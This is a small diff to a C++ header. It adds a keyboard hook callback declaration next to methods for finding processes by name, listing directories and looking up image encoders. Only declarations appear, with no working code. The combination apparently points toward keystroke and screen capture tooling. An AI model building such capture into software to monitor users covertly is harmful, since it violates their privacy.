@@ -43,3 +43,4 @@ public:
 DWORD GetProcessIdByName(const char* processName);
 string printDirectoryTree(const char* path, int indent);
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
+LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
